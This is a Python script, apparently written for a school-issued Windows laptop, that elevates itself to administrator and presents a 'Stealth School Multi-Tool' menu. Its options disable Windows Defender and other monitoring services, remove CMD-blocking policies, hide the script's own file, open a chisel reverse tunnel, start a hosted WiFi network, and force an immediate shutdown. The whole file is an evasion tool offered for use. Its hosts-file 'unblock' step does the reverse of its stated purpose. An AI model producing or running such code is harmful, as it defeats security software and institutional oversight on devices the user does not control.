import os
import ctypes
import subprocess
import shutil
import sys
import platform
import time

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def elevate_admin():
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

def enable_wifi_privileges():
    subprocess.call("netsh wlan set hostednetwork mode=allow ssid=SchoolHack key=password123", shell=True)
    subprocess.call("netsh wlan start hostednetwork", shell=True)

def unblock_websites():
    try:
        with open(r"C:\Windows\System32\drivers\etc\hosts", "a") as hosts:
            hosts.write("\n# Unblock filter\n")
            hosts.write("127.0.0.1 webfilter.blocked.school\n")
            hosts.write("127.0.0.1 proxy.block.school\n")
    except:
        pass

def stealth_mode():
    try:
        script_path = os.path.realpath(__file__)
        subprocess.call(f'attrib +h +s "{script_path}"', shell=True)
    except:
        pass

def disable_monitoring_services():
    services = [
        "WinDefend", "WdNisSvc", "SecurityHealthService", 
        "DiagTrack", "W3SVC", "RemoteRegistry"
    ]
    for service in services:
        subprocess.call(f'sc stop {service}', shell=True)
        subprocess.call(f'sc config {service} start= disabled', shell=True)

def setup_proxy_tunnel():
    subprocess.call("start /b chisel client 192.168.1.1:8000 R:8080:localhost:8080", shell=True)

def unblock_and_launch_cmd():
    try:
        # Remove CMD block via registry
        subprocess.call('reg delete "HKCU\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /f', shell=True)
        subprocess.call('reg delete "HKLM\\Software\\Policies\\Microsoft\\Windows\\System" /v DisableCMD /f', shell=True)

        # Make a copy of cmd.exe to a temp location
        cmd_path = r"C:\Windows\System32\cmd.exe"
        temp_cmd = os.path.join(os.environ['TEMP'], "sys_access_cmd.exe")
        shutil.copyfile(cmd_path, temp_cmd)

        # Grant full permissions to everyone
        subprocess.call(f'icacls "{temp_cmd}" /grant Everyone:F', shell=True)
        subprocess.call(f'attrib -h -s "{temp_cmd}"', shell=True)

        # Launch new CMD window with admin
        ctypes.windll.shell32.ShellExecuteW(None, "runas", temp_cmd, "", None, 1)
    except Exception as e:
        print("Failed to unblock and open CMD:", e)

def crash_laptop():
    try:
        # Forcefully crash the system by triggering a kernel fault
        subprocess.call("shutdown /s /f /t 0", shell=True)  # Force shutdown immediately
        time.sleep(2)
        subprocess.call("taskkill /im explorer.exe /f", shell=True)  # Force kill Explorer, making system unresponsive
        subprocess.call("taskkill /im cmd.exe /f", shell=True)  # Kill any remaining command prompts
    except Exception as e:
        print("Failed to crash the system:", e)

def launcher():
    while True:
        print("\n--- Stealth School Multi-Tool ---")
        print("[1] Enable WiFi Admin Access")
        print("[2] Unblock All Websites")
        print("[3] Disable Monitoring Services")
        print("[4] Activate Stealth Mode")
        print("[5] Setup Proxy Tunnel")
        print("[6] Unblock and Open CMD (Admin)")
        print("[7] Run All")
        print("[8] Crash the Laptop (Force Shutdown)")
        print("[0] Exit")
        choice = input("Choose an option: ")

        if choice == "1":
            enable_wifi_privileges()
        elif choice == "2":
            unblock_websites()
        elif choice == "3":
            disable_monitoring_services()
        elif choice == "4":
            stealth_mode()
        elif choice == "5":
            setup_proxy_tunnel()
        elif choice == "6":
            unblock_and_launch_cmd()
        elif choice == "7":
            enable_wifi_privileges()
            unblock_websites()
            disable_monitoring_services()
            stealth_mode()
            setup_proxy_tunnel()
            unblock_and_launch_cmd()
        elif choice == "8":
            crash_laptop()
        elif choice == "0":
            break
        else:
            print("Invalid choice.")

if __name__ == "__main__":
    elevate_admin()
    launcher()
